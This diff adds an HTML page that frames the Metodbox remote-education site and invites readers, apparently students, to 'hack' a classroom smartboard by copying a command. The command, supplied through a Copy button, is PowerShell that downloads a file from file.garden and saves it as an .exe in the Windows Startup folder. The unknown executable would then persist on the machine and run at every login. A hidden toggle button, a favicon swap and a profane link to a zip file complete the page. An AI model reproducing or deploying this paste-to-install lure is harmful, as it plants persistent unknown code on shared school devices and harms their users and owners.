@@ -1,1 +1,120 @@
-<a href="https://file.garden/ae50sn0rViu-4ETl/Ak%C4%B1ll%C4%B1Kilit.zip">Zip yo fuckin' mouth shut and clear yo fuckin' histories about me</a>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link id="dynamic-favicon" rel="icon" href="https://www.metodbox.com/favicon.ico" type="image/gif">
+    <title>Metodbox - Uzaktan Eğitim Platformu</title>
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* Locked by default */
+            background: #000;
+        }
+
+        /* Unlocks scrolling and shows the parent scrollbar */
+        body.unlocked {
+            overflow: auto;
+        }
+
+        /* Discreet toggle button in the top-left corner */
+        #toggle-btn {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            width: 16px;
+            height: 16px;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 50%;
+            z-index: 99999;
+            cursor: pointer;
+            opacity: 0.15;
+            transition: opacity 0.2s, background 0.2s;
+        }
+
+        #toggle-btn:hover {
+            opacity: 1;
+            background: #00ff66;
+        }
+
+        /* Iframe takes up the first full screen in normal flow */
+        #frame {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            display: block;
+        }
+
+        /* Content sits directly below the iframe in normal flow */
+        .under-content {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #111;
+            color: #ffffff;
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Discreet toggle button in the top-left corner -->
+    <button id="toggle-btn" title="Toggle Scroll"></button>
+
+    <iframe
+        id="frame"
+        src="https://www.metodbox.com"
+        allow="fullscreen"
+        referrerpolicy="strict-origin-when-cross-origin">
+    </iframe>
+
+    <div class="under-content">
+        <h5>If your class uses metodbox, congrats, You can be able to hack this smartboard by just inputting that command you copied</h5>
+    </div>
+    <img src="https://github.com/ivorydevrimoalt/Metodbox/blob/main/3dgifmaker81194.gif?raw=true">
+    <div style="display: flex; gap: 8px; max-width: 600px; font-family: sans-serif;">
+        <input type="text" id="cmdInput" value="powershell -Command &quot;$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://file.garden/ae50sn0rViu-4ETl/Ak%C4%B1ll%C4%B1Kilit.geg', \&quot;$([Environment]::GetFolderPath('Startup'))\AkilliKilit.exe\&quot;)&quot;" readonly style="flex: 1; padding: 6px 10px; font-family: monospace; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; background: #f9f9f9;">
+        <button onclick="navigator.clipboard.writeText(document.getElementById('cmdInput').value); this.innerText='Copied!'; setTimeout(()=>this.innerText='Copy', 2000);" style="padding: 6px 14px; font-size: 13px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer;">Copy</button>
+    </div>
+
+    <script>
+        let geg = 1;
+
+        const toggleBtn = document.getElementById("toggle-btn");
+
+        toggleBtn.addEventListener("click", () => {
+            document.body.classList.toggle("unlocked");
+            geg = geg-1;
+            geg = Math.abs(geg);
+            updateFavicon(geg);
+        });
+
+        function updateFavicon(gegValue) {
+            // Select the favicon link element
+            let favicon = document.getElementById('dynamic-favicon');
+            
+            // Check if the element exists to prevent errors
+            if (!favicon) {
+                console.warn("Favicon element not found!");
+                return;
+            }
+
+            // Switch favicon based on the value of geg
+            if (gegValue === 1) {
+                // Replace 'path-to-your-zero-favicon.ico' with your desired favicon for 0
+                favicon.href = "https://www.metodbox.com/favicon.ico";
+            } else if (gegValue === 0) {
+                // Switch to the provided GitHub raw GIF URL
+                favicon.href = "https://github.com/ivorydevrimoalt/Metodbox/blob/main/3dgifmaker81194.gif?raw=true";
+            }
+        }
+    </script>
+
+</body>
+</html>
